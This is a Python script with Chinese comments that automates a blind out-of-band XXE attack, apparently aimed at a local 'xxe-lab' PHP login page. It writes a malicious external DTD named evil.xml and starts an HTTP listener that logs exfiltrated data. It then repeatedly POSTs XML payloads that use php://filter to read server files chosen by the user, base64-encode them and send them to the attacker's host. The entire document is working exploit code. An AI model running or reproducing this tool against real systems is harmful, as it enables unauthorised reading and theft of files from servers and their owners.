#!/usr/bin/python3
# -*- coding: utf-8 -*-
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import requests
import sys

# 重写日志记录函数，将日志信息保存到文件
class MyHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # 终端输出HTTP访问信息
        sys.stderr.write("%s - - [%s] %s\n" %
                         (self.client_address[0],
                          self.log_date_time_string(),
                          format % args))
        # 保存信息到文件
        with open("result.txt", "a") as textFile:
            textFile.write("%s - - [%s] %s\n" %
                           (self.client_address[0],
                            self.log_date_time_string(),
                            format % args))

# 启动HTTP服务器，接收数据
def StartHTTP(lip, lport):
    # HTTP监听的IP地址和端口
    serverAddr = (lip, lport)
    httpd = HTTPServer(serverAddr, MyHandler)
    print(f"[*] 正在开启HTTP服务器:\n\n================\nIP地址:{lip}\n端口:{lport}\n================\n")
    # 启动HTTP服务器
    httpd.serve_forever()

# 创建攻击代码文件
def ExportPayload(lip, lport):
    with open('evil.xml', 'w') as file:
        file.write(f"<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://{lip}:{lport}/?content=%file;'>\"> %payload;")
    print("[*] Payload文件创建成功!")

# 通过POST发送攻击数据
def SendData(lip, lport, url):
    # 需要读取的文件的路径(默认值)
    filePath = "c:\\test.txt"
    while True:
        # 对用户输入的文件路径进行斜杠替换
        filePath = filePath.replace('\\', "/")
        # 构造攻击数据
        data = f"<?xml version=\"1.0\"?>\n<!DOCTYPE test[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource={filePath}\">\n<!ENTITY % dtd SYSTEM \"http://{lip}:{lport}/evil.xml\">\n%dtd;\n%send;\n]>"
        # 发送POST请求
        requests.post(url, data=data)
        # 继续接收用户输入，读取指定文件
        filePath = input("Input filePath:")

if __name__ == '__main__':
    # 本机IP
    lip = "192.168.1.2"
    # 本机HTTP监听端口
    lport = 1080
    # 目标网站提交表单的URL
    url = "http://192.168.61.134/xxe-lab/php_xxe/doLogin.php"
    # 创建payload文件
    ExportPayload(lip, lport)
    # 创建HTTP服务线程
    threadHTTP = threading.Thread(target=StartHTTP, args=(lip, lport))
    threadHTTP.start()
    # 创建发送POST数据线程
    threadPOST = threading.Thread(target=SendData, args=(lip, lport, url))
    threadPOST.start()